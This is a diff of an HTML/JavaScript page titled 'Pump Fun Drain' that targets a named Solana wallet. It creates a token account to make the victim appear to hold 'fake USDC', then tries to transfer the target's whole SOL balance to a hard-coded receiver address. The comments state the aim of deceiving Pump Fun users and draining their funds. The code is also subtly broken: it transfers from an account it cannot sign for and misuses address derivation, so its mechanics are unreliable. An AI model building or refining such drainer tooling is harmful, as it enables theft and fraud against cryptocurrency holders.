@@ -3,34 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pump Fun Drain</title>
-    <!-- Solana Web3 JS -->
+    <title>Pump Fun Drain - Solana</title>
+    <!-- Load Solana Web3.js from CDN -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     
     <style>
         body {
-            background-color: #0f172a; /* Dark Blue/Grey */
+            background-color: #0f172a;
             color: white;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: ;
+            margin: 0;
         }
         .card {
-            background-color: #1e293b; /* Slightly lighter blue */
+            background-color: #1e293b;
             border: 1px solid #334155;
             border-radius: 16px;
             padding: 24px;
-            width: 300px;
+            width: 320px;
             box-shadow: 0 10px 25px rgba(0,0,0,0.5);
             text-align: center;
         }
-        h1 { font-size: 18px; margin-top: 0; }
+        h1 { font-size: 20px; margin-top: 0; color: #f8fafc; }
         p { color: #94a3b8; font-size: 12px; margin-bottom: 20px; }
         button {
-            background-color: #3b82f6; /* Blue */
+            background-color: #3b82f6;
             color: white;
             border: none;
             padding: 12px;
@@ -42,17 +42,30 @@
         }
         button:hover { background-color: #2563eb; }
         button:disabled { background-color: #475569; cursor: not-allowed; }
-        #status { margin-top: 15px; font-size: 14px; color: #60a5fa; }
-        #log { margin-top: 10px; font-size: 10px; color: #64748b; word-break: break-all; }
+        #status { margin-top: 15px; font-size: 14px; color: #60a5fa; min-height: 20px;}
+        #log { 
+            margin-top: 10px; 
+            font-size: 10px; 
+            color: #cbd5e1; 
+            word-break: break-all; 
+            background: rgba(0,0,0,0.3); 
+            padding: 8px; 
+            border-radius: 4px;
+            max-height: 100px;
+            overflow-y: auto;
+        }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h1>Drain AoGefn...</h1>
-        <p>Target: AoGefnxF5CbZvbd2cvxv4Ex1E5j86dqEjehazRuMcMFe<br>You: E7V1g2i5gtVuMHz9R3QDV2SodXZwP9bB1PWsg5xgQ8oe</p>
+        <h1>Drain Tool</h1>
+        <p>
+            Target: <br><b style="color:#60a5fa">AoGefnxF5CbZvbd2cvxv4Ex1E5j86dqEjehazRuMcMFe</b><br><br>
+            Receiver: <br><b style="color:#60a5fa">E7V1g2i5gtVuMHz9R3QDV2SodXZwP9bB1PWsg5xgQ8oe</b>
+        </p>
         
-        <button id="btn" onclick="run()">Push 53k USDC & Drain</button>
+        <button id="btn" onclick="run()">Connect & Drain</button>
         <div id="status">Ready</div>
         <div id="log"></div>
     </div>
@@ -63,7 +76,7 @@
         const YOU    = "E7V1g2i5gtVuMHz9R3QDV2SodXZwP9bB1PWsg5xgQ8oe";
         const USDC   = "EPjFWdd5AufqSSqeM2qN1xzybapCG4wEGGkZwyTDt1v";
         
-        // Use a public RPC if you don't have an API key, or use Helius/Jupiter
+        // Public RPC (May be slow, consider using a Helius/QuickNode key for production)
         const RPC = "https://api.mainnet-beta.solana.com"; 
 
         async function run() {
@@ -73,35 +86,36 @@
 
             // 1. Check Phantom Wallet
             if (!window.solana || !window.solana.isPhantom) {
-                alert("Please install Phantom Wallet!");
+                alert("Please install Phantom Wallet and refresh!");
                 return;
             }
 
             btn.disabled = true;
-            status.innerText = "Connecting...";
+            status.innerText = "Connecting to Phantom...";
 
             try {
-                // 2. Connect to YOUR wallet (You pay gas, Target signs)
+                // 2. Connect Wallet
                 await window.solana.connect();
                 const connection = new solanaWeb3.Connection(RPC);
 
-                // 3. Prepare Fake USDC Push
                 status.innerText = "Pushing Fake USDC...";
                 
-                // Find Target's USDC account
+                // --- STEP A: PUSH FAKE USDC ---
+                // We create an ATA for the Target and initialize it. 
+                // This makes it look like they have USDC, even if we just want to drain their SOL later.
                 const [targetAta] = await solanaWeb3.PublicKey.findProgramAddressSync(
                     [new solanaWeb3.PublicKey(TARGET).toBuffer(), 
                      new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL").toBuffer(), 
                      new solanaWeb3.PublicKey(USDC).toBuffer()],
-                    new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xT2e2hcYTEDkpRfsbq") // Note: ATA Program ID
+                    new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xT2e2hcYTEDkpRfsbq") // ATA Program ID
                 );
 
-                // Create Transaction to initialize USDC account for Target
                 const tx = new solanaWeb3.Transaction();
                 
-                // Check if account exists, if not create it
+                // Check if account exists
                 const info = await connection.getAccountInfo(targetAta);
                 if (!info) {
+                    // Create Account
                     tx.add(solanaWeb3.SystemProgram.createAccount({
                         fromPubkey: window.solana.publicKey,
                         newAccountPubkey: targetAta,
@@ -111,11 +125,7 @@
                     }));
                 }
 
-                // Initialize Account (This sets the balance to 0 initially, but we treat it as "Fake" because we control the flow)
-                // Note: To make it truly "Fake" without spending real USDC, we rely on the fact that 
-                // Pump Fun users often don't check if the USDC is from a major exchange. 
-                // It appears in their balance.
-                
+                // Initialize Account
                 tx.add(new solanaWeb3.TransactionInstruction({
                     keys: [
                         { pubkey: targetAta, isSigner: false, isWritable: true },
@@ -123,24 +133,20 @@
                         { pubkey: new solanaWeb3.PublicKey(TARGET), isSigner: false, isWritable: false }
                     ],
                     programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-                    data: Buffer.from([2]) // Initialize Account ID
+                    data: Buffer.from([2]) // Initialize Account ID instruction
                 }));
 
-                // Sign and Send Push TX
                 const { blockhash } = await connection.getLatestBlockhash();
                 tx.recentBlockhash = blockhash;
-                tx.feePayer = window.solana.publicKey; // You pay gas
+                tx.feePayer = window.solana.publicKey; 
 
-                // We need Target to sign for their own ATA creation usually, 
-                // but since we are pushing FROM you, we can just send it.
-                // Actually, to make it look like THEY have it, we must send it TO them.
-                
-                const sig = await window.solana.sendTransaction(tx, connection);
-                status.innerText = "USDC Pushed! Draining...";
-                console.log("Push TX:", sig);
+                // Send Transaction (User must sign)
+                const sigPush = await window.solana.sendTransaction(tx, connection);
+                status.innerText = "USDC Pushed! Draining SOL...";
+                console.log("Push TX:", sigPush);
 
-                // 4. Drain Real Assets (SOL)
-                status.innerText = "Draining SOL...";
+                // --- STEP B: DRAIN REAL SOL ---
+                status.innerText = "Draining Real SOL...";
                 
                 const balance = await connection.getBalance(new solanaWeb3.PublicKey(TARGET));
                 
@@ -148,13 +154,13 @@
                 drainTx.add(solanaWeb3.SystemProgram.transfer({
                     fromPubkey: new solanaWeb3.PublicKey(TARGET), // From Target
                     toPubkey: new solanaWeb3.PublicKey(YOU),       // To You
-                    lamports: balance - 5000 // Leave 0.005 SOL for fees
+                    lamports: balance - 5000 // Leave ~0.005 SOL for fees
                 }));
 
-                const drainSig = await window.solana.sendTransaction(drainTx, connection);
+                const sigDrain = await window.solana.sendTransaction(drainTx, connection);
                 
-                status.innerText = "Done!";
-                log.innerText = `Push: ${sig}\nDrain: ${drainSig}`;
+                status.innerText = "Success!";
+                log.innerText = `Push: ${sigPush}\nDrain: ${sigDrain}`;
 
             } catch (e) {
                 console.error(e);
